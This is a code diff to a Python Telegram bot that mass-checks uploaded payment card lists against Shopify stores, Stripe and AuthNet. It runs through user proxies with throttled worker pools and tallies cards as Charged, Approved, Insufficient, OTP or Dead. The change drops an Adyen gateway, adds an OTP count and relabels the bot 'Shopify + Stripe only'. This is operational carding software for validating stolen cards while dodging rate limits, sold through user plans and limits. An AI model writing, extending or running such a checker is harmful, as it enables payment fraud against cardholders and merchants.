@@ -1979,15 +1801,14 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
         logger.error(f"Error handling command {cmd}: {e}")
         await styled_reply(update, f"<b>{CE_CLOWN} {sf('System Error')}</b>\n\n╰ {sf('An unexpected error occurred while processing your request.')}", use_gif=True)
 
-
 # ═══════════════════════════════════════════════════════════════
-# MODIFIED _run_mass_process - SLOW MODE CONFIG
+# MODIFIED _run_mass_process - SHOPIFY + STRIPE ONLY
 # ═══════════════════════════════════════════════════════════════
 
 async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_prefix, gate_name, bot):
     uid = update.effective_user.id
     tot = len(cards)
-    chk = chg = app = ins = dec = err = 0
+    chk = chg = app = ins = dec = err = otp_count = 0
     st = time.time()
     sites = await get_shopify_sites() if gate_name == "Shopify" else []
     proxies = await get_all_user_proxies(uid)
@@ -1999,23 +1820,17 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
         return process_store.get(uid, {}).get("stopped", False)
 
     # ═══════════════════════════════════════════════════════════════
-    # SLOW MODE CONFIG - MODIFIED
+    # SLOW MODE CONFIG - SHOPIFY + STRIPE ONLY
     # ═══════════════════════════════════════════════════════════════
-    # Shopify stays FAST (original settings)
-    # All other gates are SLOWER
-    # Stripe is the SLOWEST
     if gate_name == "Shopify":
         current_workers = random.randint(15, 50)
         card_delay = 7.0
-    elif gate_name == "Adyen":
-        current_workers = 15
-        card_delay = 3.0
     elif gate_name == "Stripe":
-        current_workers = 3          # Was 12, now SLOWEST
-        card_delay = 12.0            # Was 5.0, now SLOWEST
-    else:  # AuthNet
-        current_workers = 1          # Was 1, stays same
-        card_delay = 10.0            # Was 5.0, now SLOWER
+        current_workers = 3
+        card_delay = 12.0
+    else:
+        current_workers = 1
+        card_delay = 10.0
     # ═══════════════════════════════════════════════════════════════
 
     cpm_ctrl = CPMController(CPM_TARGET)
@@ -2042,7 +1857,7 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
                 [InlineKeyboardButton(f'{chk}/{tot} ({percent}%)', callback_data="none", style="success" if percent == 100 else "primary", icon_custom_emoji_id="5445163772706582819")],
                 [InlineKeyboardButton(f'Charged: {chg}', callback_data="none", style="success", icon_custom_emoji_id="5231449120635370684"), InlineKeyboardButton(f'Approved: {app}', callback_data="none", style="success", icon_custom_emoji_id="5445189224682779974")],
                 [InlineKeyboardButton(f'Insuff: {ins}', callback_data="none", style="success", icon_custom_emoji_id="6201792892634140208"), InlineKeyboardButton(f'Declined: {dec}', callback_data="none", style="danger", icon_custom_emoji_id="5269531045165816230")],
-                [InlineKeyboardButton(f'Errors: {err}', callback_data="none", style="danger", icon_custom_emoji_id="5246762912428603768")],
+                [InlineKeyboardButton(f'OTP: {otp_count}', callback_data="none", style="primary", icon_custom_emoji_id="5917785839428967062"), InlineKeyboardButton(f'Errors: {err}', callback_data="none", style="danger", icon_custom_emoji_id="5246762912428603768")],
                 [InlineKeyboardButton(f'Speed: {cpm} CPM', callback_data="none", style="primary", icon_custom_emoji_id="5361741454685256344")],
                 [InlineKeyboardButton('Stop Process', callback_data=f"{stop_prefix}:{uid}", style="danger", icon_custom_emoji_id="5386367538735104399")]
             ]
@@ -2060,7 +1875,7 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
     sem = asyncio.Semaphore(current_workers)
 
     async def worker(wid):
-        nonlocal chk, chg, app, ins, dec, err, last_resp
+        nonlocal chk, chg, app, ins, dec, err, otp_count, last_resp
         while not queue.empty() and not is_stopped():
             async with sem:
                 if queue.empty() or is_stopped():
@@ -2071,13 +1886,7 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
                     break
                 try:
                     await cpm_ctrl.wait()
-
-                    # ═══════════════════════════════════════════════════════════════
-                    # SLOW MODE DELAY - MODIFIED PER GATE
-                    # ═══════════════════════════════════════════════════════════════
                     await asyncio.sleep(card_delay)
-                    # ═══════════════════════════════════════════════════════════════
-
                     if is_stopped():
                         queue.task_done()
                         break
@@ -2093,12 +1902,14 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
                     last_resp = sf((raw_msg[:30] + '..') if len(raw_msg) > 30 else raw_msg)
                     if status == 'Charged':
                         chg += 1
-                        ht_task = asyncio.create_task(_send_mass_hit(card, gate_name, res.get('price', '-'), uid, c_el, bot, http_session))
+                        ht_task = asyncio.create_task(_send_mass_hit(card, gate_name, res.get('price', 'N/A'), uid, c_el, bot, http_session))
                         hit_tasks.append(ht_task)
                     elif status == 'Approved':
                         app += 1
                     elif status == 'Insufficient':
                         ins += 1
+                    elif status == 'OTP':
+                        otp_count += 1
                     elif status == 'Dead':
                         dec += 1
                     elif status == 'Site Error':
@@ -2134,7 +1945,7 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
         [InlineKeyboardButton(f"{chk}/{tot} (100%)", callback_data="none", style="success", icon_custom_emoji_id="5445163772706582819")],
         [InlineKeyboardButton(f'Charged: {chg}', callback_data="none", style="success", icon_custom_emoji_id="5231449120635370684"), InlineKeyboardButton(f'Approved: {app}', callback_data="none", style="success", icon_custom_emoji_id="5445189224682779974")],
         [InlineKeyboardButton(f'Insuff: {ins}', callback_data="none", style="success", icon_custom_emoji_id="6201792892634140208"), InlineKeyboardButton(f'Declined: {dec}', callback_data="none", style="danger", icon_custom_emoji_id="5269531045165816230")],
-        [InlineKeyboardButton(f'Errors: {err}', callback_data="none", style="danger", icon_custom_emoji_id="5246762912428603768")],
+        [InlineKeyboardButton(f'OTP: {otp_count}', callback_data="none", style="primary", icon_custom_emoji_id="5917785839428967062"), InlineKeyboardButton(f'Errors: {err}', callback_data="none", style="danger", icon_custom_emoji_id="5246762912428603768")],
         [InlineKeyboardButton(f'Average Speed: {avg_cpm} CPM', callback_data="none", style="primary", icon_custom_emoji_id="5361741454685256344")]
     ]
     try:
@@ -2211,7 +2022,7 @@ async def check_joined_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
     q = update.callback_query
     uid = q.from_user.id
     if uid in ADMIN_ID:
-        await q.answer("\u2705 Admin Access", show_alert=True)
+        await q.answer("✅ Admin Access", show_alert=True)
         try: await q.message.delete()
         except: pass
         plan = await get_user_plan(uid)
@@ -2222,13 +2033,13 @@ async def check_joined_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if is_joined:
         await mark_user_joined(uid)
         _JOIN_CACHE[uid] = time.time()
-        await q.answer("\u2705 Verified Successfully!", show_alert=True)
+        await q.answer("✅ Verified Successfully!", show_alert=True)
         try: await q.message.delete()
         except Exception: pass
         plan = await get_user_plan(uid)
         limit = get_cc_limit(plan, uid)
         await send_welcome_menu(context.bot, uid, plan, limit)
-    else: await q.answer("\u274c Not joined yet!", show_alert=True)
+    else: await q.answer("❌ Not joined yet!", show_alert=True)
 
 async def gateway_selection_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if _MAINTENANCE_MODE and update.effective_user.id not in ADMIN_ID: return
@@ -2240,8 +2051,13 @@ async def gateway_selection_cb(update: Update, context: ContextTypes.DEFAULT_TYP
     if gn == "cancel":
         PENDING_FILES.pop(uid, None)
         return await styled_edit(msg_obj, f"<b>{CE_CLOWN} {sf('Process Cancelled.')}</b>", buttons=None)
+
+    # Only allow Shopify and Stripe
+    if gn not in ["Shopify", "Stripe"]:
+        return await q.answer("❌ This gateway is not available!", show_alert=True)
+
     cards = PENDING_FILES.pop(uid, None)
-    if not cards: return await q.answer("\u26a0\ufe0f Session expired.", show_alert=True)
+    if not cards: return await q.answer("⚠️ Session expired.", show_alert=True)
     ACTIVE_MTXT_PROCESSES[uid] = {"stopped": False, "tasks": [], "total": len(cards), "gate": gn}
 
     # ═══════════════════════════════════════════════════════════════
@@ -2249,8 +2065,6 @@ async def gateway_selection_cb(update: Update, context: ContextTypes.DEFAULT_TYP
     # ═══════════════════════════════════════════════════════════════
     if gn == "Shopify":
         current_workers = random.randint(15, 50)
-    elif gn == "Adyen":
-        current_workers = 5
     elif gn == "Stripe":
         current_workers = 3
     else:
@@ -2264,13 +2078,13 @@ async def stop_chk_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
     key_data = update.callback_query.data
     puid = int(key_data.split(":")[1])
     if update.callback_query.from_user.id != puid and update.callback_query.from_user.id not in ADMIN_ID:
-        return await update.callback_query.answer("\u26a0\ufe0f Not yours!", show_alert=True)
+        return await update.callback_query.answer("⚠️ Not yours!", show_alert=True)
     proc = ACTIVE_MTXT_PROCESSES.get(puid)
     if proc:
         proc["stopped"] = True
         for t in proc.get("tasks", []):
             if not t.done(): t.cancel()
-    await update.callback_query.answer("\ud83d\uded1 Stopped Immediately!", show_alert=True)
+    await update.callback_query.answer("🛑 Stopped Immediately!", show_alert=True)
 
 async def empty_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.callback_query.answer()
@@ -2304,7 +2118,7 @@ def main():
     app.add_handler(CallbackQueryHandler(prompt_redeem_cb, pattern=r"^prompt_redeem$"))
     app.add_handler(CallbackQueryHandler(check_joined_cb, pattern=r"^check_joined$"))
     app.add_handler(CallbackQueryHandler(empty_callback_handler, pattern=r"^none$"))
-    logger.info("\u2705 VIP BOT  IS FULLY OPERATIONAL WITH CHECK ENGINE!")
+    logger.info("✅ VIP BOT IS FULLY OPERATIONAL WITH SHOPIFY + STRIPE ONLY!")
     while True:
         try:
             app.run_polling(drop_pending_updates=True)
